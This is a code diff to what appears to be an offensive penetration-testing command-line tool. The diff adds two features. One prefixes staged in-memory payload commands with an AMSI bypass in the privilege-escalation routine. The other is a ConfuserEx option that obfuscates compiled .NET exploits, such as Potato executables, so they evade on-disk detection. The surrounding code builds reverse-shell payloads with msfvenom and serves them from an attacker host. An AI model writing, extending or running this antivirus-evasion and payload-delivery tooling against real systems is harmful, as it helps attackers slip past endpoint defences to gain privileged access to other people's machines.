@@ -660,12 +660,15 @@ def cmd_escalate(args):
                 else:
                     directory = os.path.dirname(paths[0])
                     served = os.path.basename(paths[0])
+                    amsi = evasion_mod.amsi_prefix(cfg.get("amsi_bypass"))
+                    label = evasion_mod.amsi_label(cfg.get("amsi_bypass"))
                     with staging_mod.serve(directory) as port:
                         url = f"http://{cfg.get('lhost')}:{port}/"
                         print(f"  serving {served} on {cfg.get('lhost')}:{port} — "
-                              f"target loads it in memory")
-                        command = (vector.command.replace("{url}", url)
-                                   .replace("{served}", served))
+                              f"target loads it in memory"
+                              + (f"  (AMSI bypass: {label})" if label else ""))
+                        command = (vector.command.replace("{amsi}", amsi)
+                                   .replace("{url}", url).replace("{served}", served))
                         res = _run_vector(vector, command)
             else:
                 res = _run_vector(vector, vector.command)
@@ -875,10 +878,36 @@ def cmd_poc(args):
         print("build toolchain — which builders are installed:\n")
         for tool, path in poc_mod.toolchain():
             print(f"  {'OK ' if path else '-- '} {tool:<28} {path or 'not on PATH'}")
+        conf = poc_mod.confuser(args.confuser)
+        print(f"  {'OK ' if conf else '-- '} {'ConfuserEx (obfuscate)':<28} "
+              f"{conf or 'not found — set confuser_cli / --confuser (+ mono for a .exe)'}")
         print("\nformats: " + ", ".join(f"{f} ({b})" for f, b in sorted(poc_mod.BUILDER.items())))
         return 0
+    if args.obfuscate:  # ConfuserEx: obfuscate a compiled .NET assembly (e.g. a Potato .exe)
+        src = args.obfuscate
+        if not os.path.exists(src):  # allow naming an arsenal artifact instead of a path
+            resolved = arsenal_mod.find(src)
+            if resolved:
+                src = resolved
+        out = args.out or os.path.join(_build_dir(),
+                                       f"{os.path.splitext(os.path.basename(src))[0]}-obf.exe")
+        cfg = {}
+        if os.path.exists(_db_path(args)):
+            try:
+                with _open_store(args) as store:
+                    cfg = config_mod.load(store)
+            except FieldkitError:
+                pass
+        res = poc_mod.obfuscate(src, out, cli=args.confuser or cfg.get("confuser_cli"))
+        if not res.ok:
+            _err(f"obfuscate failed ({res.tool or 'ConfuserEx'}): {res.detail}")
+            return 1
+        print(f"obfuscated via {res.tool}: {res.path}")
+        print("  stage this in place of the stock .exe for the on-disk native rung; "
+              "the in-memory rung already evades on-disk via reflection + `amsi_bypass`.")
+        return 0
     if not args.format:
-        _err("a format is required (exe|dll|msi|so|ps1), or --check the toolchain")
+        _err("a format is required (exe|dll|msi|so|ps1), --obfuscate <exe>, or --check")
         return 2
     out = args.out or os.path.join(_build_dir(), f"payload.{args.format}")
     if not poc_mod.have(args.format) and not args.source:
@@ -1501,6 +1530,10 @@ def build_parser():
     p_poc.add_argument("--lhost", help="reverse-shell LHOST (msfvenom payload instead of a proof)")
     p_poc.add_argument("--lport", help="reverse-shell LPORT")
     p_poc.add_argument("--source", metavar="FILE", help="compile this .c with mingw (exe/dll)")
+    p_poc.add_argument("--obfuscate", metavar="EXE",
+                       help="obfuscate a compiled .NET assembly with ConfuserEx (path or arsenal name)")
+    p_poc.add_argument("--confuser", metavar="PATH",
+                       help="path to the ConfuserEx CLI (else config confuser_cli / PATH)")
     p_poc.add_argument("--check", action="store_true", help="report which builders are installed")
     p_poc.set_defaults(func=cmd_poc)
 
